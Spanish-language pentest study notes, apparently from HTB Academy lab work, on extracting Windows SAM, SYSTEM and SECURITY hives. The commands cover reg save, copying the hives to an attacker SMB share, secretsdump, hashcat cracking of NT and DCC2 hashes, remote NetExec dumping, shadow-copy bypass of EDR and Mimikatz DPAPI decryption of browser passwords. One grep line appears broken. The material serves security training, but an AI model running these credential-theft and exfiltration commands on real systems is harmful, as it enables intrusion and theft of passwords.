# SAM - SYSTEM - SECURITY.

La base de datos SAM almacena los hashes NT de todas las cuentas locales de Windows. Está protegida por el kernel mientras el sistema está activo (no puede copiarse directamente), pero existen múltiples vías para extraerla: mediante el registro, desde un sistema offline o usando Volume Shadow Copies.

### Estructura de los archivos

Los tres archivos relevantes están en `C:\Windows\System32\config\`:

| Registry Hive   | Contenido                                                            |
| --------------- | -------------------------------------------------------------------- |
| `HKLM\SAM`      | Hashes NT de cuentas locales, cifrados con la boot key               |
| `HKLM\SYSTEM`   | Boot key (SYSKEY) necesaria para descifrar SAM                       |
| `HKLM\SECURITY` | Credenciales de dominio cacheadas (DCC2), claves DPAPI, secretos LSA |

> SAM sin SYSTEM es inútil. Siempre hay que exfiltrar ambos juntos para poder descifrar los hashes.

### Extracción mediante reg save (requiere privilegios locales)

Desde una CMD con privilegios de administrador local o SYSTEM, `reg.exe` permite guardar copias de los hives directamente:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Si solo se quieren los hashes de cuentas locales, basta con `SAM` + `SYSTEM`. Añadir `SECURITY` es recomendable porque puede contener credenciales de dominio cacheadas en sistemas unidos a un dominio.

### Exfiltración — SMB server con Impacket

Una vez guardados los hives, se pueden mover al host atacante levantando un share temporal con `smbserver.py`:

```bash
# En el host atacante — levantar share SMB
sudo impacket-smbserver -smb2support CompData /tmp/loot/
```

```cmd
# En el host Windows — mover los ficheros al share
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

> El flag `-smb2support` es necesario en sistemas Windows modernos donde SMBv1 está desactivado por defecto.

### Dumping de hashes — secretsdump offline

Con los tres archivos en el host atacante, `secretsdump` extrae los hashes directamente:

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Salida típica:

```
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
```

El formato de cada línea es `usuario:RID:lmhash:nthash:::`. El valor `aad3b435b51404eeaad3b435b51404ee` es el hash LM vacío, indica que LM está desactivado. El hash útil es el último campo (NT hash).

> El primer paso que ejecuta secretsdump es recuperar la boot key del SYSTEM antes de proceder con los hashes. Sin ella los valores en SAM no pueden descifrarse.

### Cracking de hashes NT con Hashcat

Extraer solo los NT hashes a un fichero y atacarlos con modo `-m 1000`:

```bash
# Preparar fichero con solo los NT hashes
grep -oP '(?<=:::$)[^:]+(?=:::)' sam.save  # alternativa: copiar manualmente

# Cracking
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Los sistemas modernos (post-Vista) almacenan contraseñas como NT hashes. Los sistemas legacy (pre-Vista) pueden tener LM hashes, mucho más débiles.

### Dumping remoto — NetExec

Con credenciales de administrador local no es necesario tener shell interactiva. NetExec puede volcar SAM y LSA directamente por red:

```bash
# Volcar SAM remoto
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam

# Volcar LSA secrets remoto
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
```

El flag `--local-auth` indica que las credenciales son de una cuenta local, no de dominio. La salida incluye los hashes en el mismo formato que secretsdump, y NetExec los guarda automáticamente en `~/.cme/logs/`.

### Volume Shadow Copies

Si `reg save` está bloqueado por EDR, las VSS permiten acceder a los archivos del sistema sin restricciones del kernel:

```cmd
# Listar shadow copies disponibles
vssadmin list shadows

# Crear una nueva si no hay ninguna
vssadmin create shadow /for=C:

# Copiar SAM y SYSTEM desde la shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Domain Cached Credentials (DCC2)

`SECURITY` contiene los hashes de las últimas cuentas de dominio que iniciaron sesión localmente (por defecto las últimas 10). Permiten login offline cuando el DC no está disponible. El formato es:

```
dominio.local/Usuario:$DCC2$10240#usuario#23d97555681813db79b2ade4b4a6ff25
```

Son hashes DCC2 (MS-Cache v2), basados en PBKDF2, aproximadamente **800 veces más lentos de crackear que NTLM**. En el mismo hardware donde NTLM va a \~4.6 MH/s, DCC2 va a \~5.5 kH/s:

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

> DCC2 no sirve para Pass-the-Hash. Solo son útiles si se descifran a plaintext. Con contraseñas fuertes son prácticamente imposibles de crackear en los plazos típicos de un pentest — priorizar wordlists cortas y focalizadas sobre brute-force.

### DPAPI — Data Protection API

Además de DCC2, `SECURITY` expone las claves DPAPI de máquina y usuario. DPAPI es el sistema de Windows para cifrar datos por usuario: lo usan Chrome, IE/Edge, Outlook, Remote Desktop Connection y el Credential Manager, entre otros.

Con las claves DPAPI volcadas, es posible descifrar credenciales almacenadas por estas aplicaciones:

```cmd
# Mimikatz — descifrar credenciales guardadas de Chrome
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

Salida:

```
URL     : http://10.10.14.94/login.html
Username: bob
Password: April2025!
```

| Aplicación                | Datos cifrados con DPAPI               |
| ------------------------- | -------------------------------------- |
| Internet Explorer / Edge  | Autocompletado de formularios de login |
| Google Chrome             | Contraseñas guardadas                  |
| Outlook                   | Contraseñas de cuentas de correo       |
| Remote Desktop Connection | Credenciales de conexiones guardadas   |
| Credential Manager        | Shares, VPN, redes WiFi                |

Para volcado remoto de DPAPI: herramienta `DonPAPI` o `impacket-dpapi` con las claves obtenidas de LSASS.

> El volcado de DPAPI es especialmente valioso en estaciones de trabajo de administradores y equipos de IT, donde Chrome y Outlook suelen tener guardadas credenciales de sistemas críticos.
